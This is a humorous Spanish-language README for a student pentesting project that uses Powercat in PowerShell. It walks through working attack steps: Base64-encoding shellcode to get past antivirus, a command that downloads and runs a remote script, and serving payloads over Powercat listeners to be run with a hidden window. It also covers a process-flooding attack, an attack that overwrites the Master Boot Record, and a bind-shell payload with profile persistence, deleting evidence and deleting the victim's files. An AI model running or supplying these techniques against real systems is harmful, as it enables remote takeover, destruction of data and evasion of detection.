# PowercatHax: Pentesting con Powercat

# Licencia

<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Licencia de Creative Commons" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">PowercatHax</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://twitter.com/StickBrush" property="cc:attributionName" rel="cc:attributionURL">StickBrush [zerø]</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Reconocimiento 4.0 Internacional License</a>.

# Disclaimer

Todo este proyecto es susceptible de ser usado con fines destructivos. No me hago responsable del uso que se le dé. Como dijo un gran hombre, "Un gran poder conlleva una gran responsabilidad".

# Introducción

## Origen de este proyecto

Este proyecto es una parte de un trabajo en grupo para la asignatura *Auditoría y Legislación Informática*. No obstante, ya que esta parte no entra en el proyecto, incluiré comentarios propios que evidentemente no estaban en el trabajo. Preparaos para mucho humor referencial.

## ¿Qué es Powercat?

Powercat es un pequeño script para PowerShell que no fue diseñado originalmente para pentesting. Se le apoda “la navaja suiza” por el gran conjunto de opciones que permite. En el fondo, es una versión PowerShell de la herramienta netcat, con funciones extra. Es ampliamente utilizada para depurar aplicaciones web en entornos que utilicen PowerShell.

En el fondo, Powercat tan solo es una aplicación de I/O sencilla, en la que un lado se queda escuchando en un puerto (servidor) y el otro lado se conecta a él (cliente).

Esto se puede utilizar para chats sencillos, para transferencia de archivos, para crear servidores web… O para hacer el mal y sembrar el caos y la destrucción en ordenadores ajenos. Depende de si eres un programador web o Ganondorf. Y no sé vosotros, pero yo de momento no sé JavaScript.

# Shellcodes encodeadas

Una shellcode, en general, es código que se ejecuta en PowerShell. Pueden ser comandos, funciones, o scripts enteros. Por ejemplo, esto es una shellcode muy sencilla:

```bash
Write-Host 'Esto es una shellcode'
```

PowerShell admite codificar cadenas de caracteres en Base64. Además, permite ejecutar shellcodes que hayan sido codificadas en Base64: Las famosas “shellcodes encodeadas”. Por ejemplo, la shellcode anterior queda así encodeada:

```
VwByAGkAdABlAC0ASABvAHMAdAAgACcARQBzAHQAbwAgAGUAcwAgAHUAbgBhACAAcwBoAGUAbABsAGMAbwBkAGUAJwA=
```

Esto tiene una ventaja: Si nuestro código ejecuta acciones maliciosas o potencialmente peligrosas para el usuario, el antivirus sería incapaz de detectarlas hasta el momento de su misma ejecución. Las shellcodes encodeadas le dan el potencial a un inofensivo .txt de realizar cualquier acción en un ordenador. Eso puede sonar muy bonito, pero créeme: El poder corrompe. De hecho, si ya has entrado aquí con intenciones de romper cosas, ya estabas corrupto de antes.

Para encodear una shellcode y ejecutarla, no tenemos más que ejecutar lo siguiente:

```bash
$comando = ‘<shellcode>’
$bytes = [System.Text.Encoding]::Unicode.GetBytes($comando)
$shenc = [Convert]::ToBase64String($bytes)
```

El primer comando guarda nuestra shellcode en una variable. Podría escribirse la shellcode literalmente en la terminal interactiva, leerse de un fichero o cualquier otro modo de almacenarla en una variable.
El segundo, convertirá nuestro texto a los bytes correspondientes en Unicode.
La tercera convierte estos bytes en el texto encodeado definitivo. Este puede ejecutarse sin más o guardarse en un fichero ($shenc > ShEnc.txt).

Y bueno, sí, hasta ahora hemos convertido un texto legible en un puñado de letras aleatorias... ¿Y eso de qué nos vale? Lo sabrás pronto.

# Ejecución remota de código arbitrario en PowerShell

Y tan pronto, ¿eh?

## Preparativos

Para poder ejecutar código arbitrario remotamente en PowerShell necesitamos:

1. Comprender el concepto de shellcode encodeada y saber encodear una shellcode. (Si no lo sabes, viene justo antes).
2. Tener una shellcode que queremos ejecutar en otro ordenador.
3. Tener Powercat en PowerShell en ambos ordenadores.
4. Acceso (físico o remoto) a ambos ordenadores.

### Instalando Powercat

La instalación de Powercat es muy sencilla. Siguiendo [el GitHub del creador](https://github.com/besimorhino/powercat "GitHub del creador"), solo necesitamos ejecutar el siguiente comando para tener Powercat listo:

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```

Esto descargará el .ps1 de Powercat y lo incluirá en la sesión actual de PowerShell.

### ¿Cómo funciona Powercat?

Powercat consta de un único comando (powercat) al que se le pasan una serie de parámetros. Los más comunes son:

Parámetro | Descripción
--- | ---
-l | Pone a Powercat en modo listener (servidor).
-c <IP> | Conecta Powercat con la IP especificada (cliente).
-p <puerto> | Especifica en qué puerto escuchar o a qué puerto conectarse.
-i <fichero o variable> | La entrada de Powercat dejará de ser el teclado para ser lo especificado.

Hay más, como -of <archivo>, que supuestamente guarda lo que recibe en un archivo en vez de mostrarlo. Pero yo no he sido capaz de hacerla funcionar, y mira que lo he intentado.

## Pruebas de concepto

### Prueba 1: Hiperpaginación y eurobeat oculto con Powercat

#### Preparación previa

Para esta prueba, utilizaremos dos ordenadores:
1. El ordenador del pentester, que servirá la shellcode maliciosa.
2. El ordenador ~~de la pobre víctima~~ a auditar, al que el pentester tendrá acceso.

Nuestro objetivo principal es provocar *thrashing* o hiperpaginación en el ordenador atacado.

Es lo que se ha llamado de toda la vida "Petarte el PC abriendo mil cosas". Pero si quieres una explicación más técnica, ten aquí: Este estado se alcanza al haber demasiados procesos en memoria: Cada proceso podrá tener muy pocas páginas en memoria. Esto conlleva que todos los procesos generen casi continuamente fallos de página, lo que aumenta aún más la carga de la CPU y ralentiza el ordenador al punto de dejarlo inoperable hasta que los procesos mueran.

Además, pretendemos ponerle a la víctima música de fondo mientras abrimos procesos, porque queda demasiado gracioso y porque podemos hacerlo. Si metéis eurobeat, mejor. En mi caso lo hice con Running in the 90's, pero no puedo pasaros el link porque copyright. De todos modos, no creo que os cueste encontrar una descarga directa de Running in the 90's.

#### Ejecución

Lo primero es crear la shellcode que inicie procesos infinitos y reproduzca el eurobeat a nuestra elección. Esta shellcode se encuentra en este mismo GitHub con el nombre "KanseiScripto.txt".

El siguiente paso es encodearlo. Recomiendo borrar los comentarios para que el archivo encodeado a transmitir sea menor.

Ahora hay que guardarla en un archivo para enviarla. Para ello, usad lo siguiente:

```bash
$shenc > KanseiEncripto.txt
```
##### Aviso de error

Por algún motivo, pasar ese .txt por Powercat directamente hace que el receptor lo obtenga de forma extraña y llena de espacios intermedios. Para solucionarlo, copiad el contenido del .txt que habéis generado, eliminadlo, pegadlo en otro Bloc de notas y volved a guardarlo en el mismo sitio con el mismo nombre.

---

Ahora que tenemos la shellcode a enviar, procederemos a crear el servidor en el ordenador local. Para ello, ejecutaremos lo siguiente:

```powershell
powercat –l –p 80 –i .\KanseiEncripto.txt
```

Esto creará un servidor en el puerto 80 (típicamente abierto para conexiones http) que sirva la shellcode encodeada a aquel que se conecte.

Lo siguiente es conectarnos a este servidor desde la máquina atacada. La IP del servidor en este ejemplo será 0.0.0.0, pero recordad que debéis usar la IP real del servidor.

```bash
powercat –c 0.0.0.0 –p 80
```

##### Posibles errores

###### ¡No se conecta!

Mira a ver el Firewall de Windows, el antivirus... Pero sobre todo, mira a ver si te has dejado 0.0.0.0 como IP.

###### ¡Se conecta, pero no me muestra nada!

Sí, eso me pasaba a mí. Machaca el Enter como un mono en el ordenador que hace de servidor. Por algún extraño motivo, eso hace que funcione.

---

Si todo ha salido bien, veremos en la PowerShell el script que estábamos sirviendo.

Lo siguiente que debemos hacer es copiar este código y abrir el Bloc de notas de Windows. Una vez hecho, debemos pegar el código en él y eliminar todos los finales de línea que nos da el copiar de PowerShell. Por último, guardaremos el archivo (en nuestro caso, se llamará Enc.txt) en la carpeta de trabajo de PowerShell.

Ahora, solo nos queda pasar la shellcode encodeada a PowerShell. Para ello, la guardaremos en una variable:

```bash
$enc = cat .\Enc.txt
```

Una vez guardada, la ejecutaremos en PowerShell sin perfil y con la ventana oculta. Para ello, hacemos:

```bash
powershell –nop –window hidden –enc $enc
```

Una vez hecho, desaparecerá la ventana de PowerShell y... Bueno, comprobad vosotros mismos lo que pasa.

##### Posibles daños

Si la máquina atacada tiene esta vulnerabilidad, tiene un problema serio (como veremos luego). No obstante, la ejecución de este script no genera un gran daño: En un reinicio, todo está resuelto. Podemos perder archivos temporales en los que estuviésemos trabajando, pero por lo general, no vamos a producir daños severos.

### Prueba 2: Produciendo daños serios en modo administrador

#### Aviso

La prueba anterior la puedes hacer en tu PC. Es un poco de demente, pero yo, como buen demente que soy, lo hice. La de ahora, NI SE TE OCURRA ejecutarla en tu PC. Tengo puestas medidas en mil sitios para que, si la ejecutas, es que sabías perfectamente lo que estabas haciendo. Si quieres probarla por curiosidad, haz una máquina virtual de Windows y ejecútala allí. Recomiendo Windows 7: Trae PowerShell por defecto y es bastante fácil de encontrar.

#### Preparación previa

Idéntica a la anterior, salvo por un matiz: La PowerShell de la máquina atacada debe ejecutarse como administrador.

Nuestro objetivo será producir daños severos o fatales al ordenador atacado. En este caso, sobreescribir el Master Boot Record por "Omae wa mou shindeiru", reiniciándole además el ordenador.

Al estar en modo administrador, podemos ejecutar absolutamente cualquier cosa y no estamos limitados por nada. Podríamos incluso alterar las políticas de PowerShell, o añadir nuestro ordenador a la lista de confianza del ordenador atacado (esto nos permite administrar la PowerShell remotamente, directamente desde PowerShell, de manera nativa).

La shellcode se puede encontrar en este mismo GitHub con el nombre "NANI.txt".

Volvemos a hacer lo mismo que en la prueba anterior: Encodeamos la shellcode, la enviamos mediante Powercat, y al recibirla en el otro ordenador, la ejecutamos con la ventana oculta.

Y, [si hemos descomentado la última línea...](https://youtu.be/YSgpU70MZno?t=31s "No spoilers")

#### Posibles daños

En el caso de este script, es casi el máximo daño que se puede hacer: Hemos sobreescrito el Master Boot Record, el ordenador no va a iniciar. Puede intentar restaurarlo o volverlo a generar, pero el usuario promedio tenderá a reinstalar el sistema operativo, con todo lo que ello implica: Borrado total de los datos del disco duro. Podríamos llegar a hacer aún más daños, como utilizar herramientas de overclock para modificar el voltaje del procesador, lo que nos permitiría elevarlo para quemarlo, ocasionando grandes pérdidas de dinero.

Informalmente: Ten cuidado con ejecutar la PowerShell como admin, porque puede que te quedes sin ordenador.

### Prueba 3: Toma de control con Powercat

#### Preparación previa

Tan solo necesitaremos acceso a ambos ordenadores y Powercat. Utilizaremos solo Powercat y sus funciones, no necesitamos más scripts.

Esta prueba se presenta como una especie de mini-historia, que mezcla hacks, lore, referencias a Persona 5 y frikismo como si lo fueran a prohibir.

#### Ejecución

Eres parte de un grupo de hacktivistas que se hacen llamar los Ladrones Fantasma de Corazones. Y resulta que quieres pillar el control del PC de un señor que te da mal rollo porque se llama Malo McMalo, lleva sombrero, se tapa la cara con el humo de un cigarro, sus enemigos desaparecen en misteriosas circunstancias, programa en COBOL, escribe con Comic Sans, juega a Pikachu Enmascarada en el Pokkén Tournament... Lo que hace un criminal típico.

Para hacerlo, tendremos que generar un payload desde Powercat. En nuestro caso, el payload es una shellcode encodeada, sin más. El payload dejará un servidor en el puerto 443, que le dará el control de la PowerShell al atacante. Para ello, hacemos:

``` bash
powercat –l –p 443 –ep –ge > Payload.txt
```

En este comando usamos dos flags nuevos:
- *-ep*: Significa "Execute PowerShell". Al conectar al servidor, en lugar de servir un archivo, una variable o la entrada del teclado, directamente sirve la PowerShell que está ejecutando Powercat.
- *-ge*: Significa “Generate Encoded”. En lugar de ejecutar el comando, Powercat generará una shellcode encodeada que ejecute el comando dicho. Existe una diferencia fundamental entre encodear este shellcode y utilizar el flag: La shellcode encodeada que genera Powercat funciona incluso si Powercat no está instalado. Esto significa que, si por casualidad se utilizase una PowerShell con acceso de administrador, se podría incluir en el perfil por defecto y ejecutarse con cada inicio, por lo que se podría controlar eternamente ese ordenador.

Volvemos a hacer lo que hacemos siempre: Pasamos el payload al otro ordenador con Powercat y lo ejecutamos en oculto.

Ahora que está ejecutando en oculto, nos volvemos a conectar a la misma IP, utilizando como puerto el 443. Es decir:

```bash
powercat –c 0.0.0.0 –p 443
```

(Nota: Si no te sale nada, machaca Enter como un mono, pero desde el ordenador que estás usando ahora, no el atacado. Por algún extraño motivo, funciona.)

Al hacerlo, nos aparecerá el texto de una nueva sesión de PowerShell. Salvo por una cosa: No tenemos autocompletado con el tabulador, y eso duele, MUCHO. Pero es lo que tiene usar un programa de depuración de aplicaciones web para tomar control de ordenadores, que funciona raro.

Ahora que tienes acceso al PC, borras el archivo de texto que generó el script para no dejar pruebas. Haces ``ls``, y descubres que entre las demás carpetas (Desktop, Documents...), tiene una llamada Evil Deeds. Lo típico, ¿no? Vas a tu PC y tienes Mis documentos, Mis imágenes, Mi música y Mis asuntos turbios. Es lo que hace todo el mundo. Además, la ISO tiene un estándar de "malo que se ve desde China que es malo" que te obliga a hacer eso si eres malo.

Abres la carpeta de Evil Deeds y descubres dos archivos: `Cuentas ilegales.txt` y `Pornografía infantil.png`. Lo dicho: El tío es malo obviamente, pero al menos es un malo obvio de calidad certificada por la ISO.

(Si tienes curiosidad: `Cuentas ilegales.txt` en mi prueba era la frase "Soy demasiado vago para ponerle contenido de verdad" copypasteada hasta llegar a 8 MB y `Pornografía infantil.png` era un fondo de pantalla de los Phantom Thieves of Hearts de Persona 5).

Ahora que sabes al 100% que es malo, echas una captura de los archivos y se los borras. Por último, le dejas una nota: *"This data has been stolen by the Phantom Thieves of Hearts"*. Una vez hecho eso, haces exit y te sales por completo.

Efectivamente, el malo flipará en colores.

#### Potencial de esta prueba

Infinito. Puedes hacer la primera prueba. Si pillas una PowerShell de admin, puedes hacer la segunda. Puedes [cambiarle el fondo de escritorio](https://social.technet.microsoft.com/Forums/windows/es-ES/72a9b4bf-071b-47cd-877d-0c0629a9eb90/how-change-the-wallpaperbackground-with-a-command-line-?forum=w7itproui "Cosas malignas"), puedes borrarle archivos importantes, puedes ejecutarle programas, puedes ver sus archivos, puedes instalarle Powercat para enviar sus archivos a tu PC... Todo lo que permita hacer PowerShell, que viene a ser todo lo que se puede hacer con un ordenador, lo puedes hacer.

# ¿Por qué usar Powercat?

En el fondo, las pruebas anteriores pueden hacerse de otras maneras: Con “virus” al uso, con otras herramientas de hacking, pasando de otro modo los .txt, sin encodear las shellcodes… ¿Qué ventajas tiene la metodología seguida?
1. Es indetectable. Los antivirus detectan las shellcodes maliciosas, pero esto no es así si están encodeadas. Algunos (más inteligentes) bloquean shellcodes encodeadas de herramientas de hacking que ya están predefinidas, pero dado que utilizamos scripts que no son de dichas herramientas, somos virtualmente indetectables. Concretamente, se han utilizado dos ordenadores con dos antivirus diferentes (Avast y Windows Defender) que no han detectado ninguna shellcode encodeada como virus, ni siquiera durante la ejecución (aunque Avast salta al ocultar la ventana de la PowerShell).
2. No tenemos bloqueos. En este caso, hemos utilizado el puerto 80, pero podríamos haber utilizado otros (21, puerto del FTP, por ejemplo). Esto significa que, a diferencia de haber utilizado servidores tipo nube (Google Drive o similares), no estamos rastreados por firewalls de HTTP, ni estamos limitados por bloqueos internos (típico en empresas). Es decir: No hemos levantado una sospechosa conexión HTTP hacia otro ordenador, por lo que (si está configurado solo para HTTP) nuestra conexión no ha sido bloqueada por el firewall.

Esto no es del todo cierto... Pero eh, ¿y lo bonito que queda en el trabajo?

# Conclusiones finales

Powercat es una herramienta que hace honor a su apodo: Es una verdadera navaja suiza. Sirve para ejecutar código arbitrario. Sirve para dañar máquinas. Sirve para transferir archivos. Sirve para tomar el control de máquinas. Y, además, puede utilizarse para propósitos fuera del pentesting (chats, servidores web…). Como herramienta inusual que es, los sistemas antivirus no están preparados para detectarla. En el fondo, Powercat es una herramienta que puede ser algo arcaica o complicada de usar, pero tiene un enorme abanico de posibilidades, dentro y fuera del pentesting.

# Agradecimientos especiales
- A la gente que hace scripts guays con PowerShell, porque sin ellos estaría suspenso.
- Al libro "Pentesting con PowerShell" de 0xWORD, aunque haga cosas extrañas y no haya conseguido replicar muy bien sus pruebas.
- A [@BlazeNeko_](https://www.twitter.com/BlazeNeko_), porque gracias a él/por su culpa hicimos este trabajo sobre PowerShell y no sobre SHODAN.
